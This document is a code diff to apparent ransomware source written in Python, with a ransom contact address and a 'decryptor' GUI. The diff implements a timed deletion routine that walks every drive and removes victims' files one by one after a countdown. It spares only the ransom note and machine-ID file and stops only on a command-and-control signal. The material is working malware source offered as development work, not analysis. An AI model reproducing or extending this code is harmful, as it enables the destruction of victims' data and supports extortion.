@@ -11,7 +11,7 @@ import base64
 from ctypes import windll
 from datetime import datetime, timedelta
 from json import dumps
-from os import makedirs, path, remove, walk
+from os import makedirs, path, remove, walk, access, W_OK
 # import tkinter as tk
 from tkinter import Toplevel, Entry, Label, Button, simpledialog, FLAT, messagebox, Tk, END, Listbox, Frame, BOTH, X, \
     TOP, LEFT, Scrollbar, Text, RIGHT, HORIZONTAL
@@ -1078,14 +1078,14 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
     # Step 54: Function to begin the deletion sequence by execution deletion_process()
     def begin_deletion_sequence(self):
         if not self.stopDeletion:
-            self.log("Time is up. Starting file deletion sequence.", "red")
+            self.log("[*] Time is up. Starting file deletion sequence.", "red")
             self.deletion_dialog = DeletionCountdownDialog(self, self. stop_deletion_process)
             self.deletion_process()
 
 
     # Step 55: Function to handle the deletion process
     def deletion_process(self):
-        self.log("Deletion process started.", 'yellow')
+        self.log("[*] Deletion process started.", 'yellow')
         self.deletionThread = Thread(target=self.delete_files_with_timing, daemon=True)
         self.deletionThread.start()
 
@@ -1102,10 +1102,81 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         # because if application close or crashed, we need Machine_id.txt to be able to Recover a Decryption key
         excludeFiles = {'Machine_id.txt', 'read_me_for_decryption.txt'}
 
+        # Define built-in func function to handle a deletion process for all files in a directory
         def handle_deletion(directory):
-            pass
+
+            # Iterate on all directories and subdirectories plus all files
+            for currentDirectory, directories, files in walk(directory, topdown=False):
+
+                # bypass exclude directories
+                if any(excludeDir in currentDirectory for excludeDir in excludeDirectories):
+                    continue
+
+                # iterate on all files
+                for file in files:
+
+                    # bypass exclude files
+                    if file in excludeFiles:
+                        continue
+
+                    # make a path of file
+                    filePath = path.join(currentDirectory, file)
+
+                    # if don't have permission, submit Access denied log
+                    if not access(filePath, W_OK):
+                        self.log(f"[-] Access denied to {filePath}. Skipping.")
+                        continue
+
+                    # if stop_signal(self destroy) arrived from C&C, submit Stop signal received log
+                    if self.stopEvent.is_set():
+                        self.log("[+] Stop signal received. Stopping deletion process.", 'orange')
+                        return
+
+                    # try to remove filePath and submit log for that
+                    try:
+                        remove(filePath)
+                        self.log(f"Deleted: {filePath}")
+                    except PermissionError as e:
+                        self.log(f"[-] Permission denied to delete {filePath} | Error: {e}")
+                    except Exception as e:
+                        self.log(f"[-] Error during deletion of {filePath} | Error: {e}")
+
+                    # wait 5 second before deleting next file
+                    sleep(5)
+
+                    # if files and directories is NOT, mean all of them is deleted successfully
+                    if not directories and not files:
+                        self.log(f"[+] All files have been deleted from {currentDirectory}.")
+                        return
 
 
+        # iterate on each drive to find D-Data and delete all files in the D-Data directory
+        for drive in drives:
+            # make the path of D-Data
+            dDataPath = path.join(drive, "D-Data")
+
+            # first, if D-Data exists, delete all files in the D-Data
+            if path.exists(dDataPath):
+                
+                # submit log and delete all files in the D-Data
+                self.log(f"[+] Start Deletion files in {dDataPath}...")
+                handle_deletion(dDataPath)
+
+                # set stop_event and return
+                if self.stopEvent.is_set():
+                    return
+
+        # iterate on each drive to find Other files and delete all other files in all drives
+        for drive in drives:
+            # Submit start deletion log
+            self.log(f"[+] Start Deletion files in {drive}...")
+
+            # Delete all files in the drive
+            handle_deletion(drive)
+
+            # set stop_event and break
+            if self.stopEvent.is_set():
+                break
 
 
 
@@ -1113,4 +1184,3 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
 if __name__ == "__main__":
     # Create an instance of the EncryptionTool class
     decryptor = DecryptorApp()
-    decryptor.scan_and_decrypt()
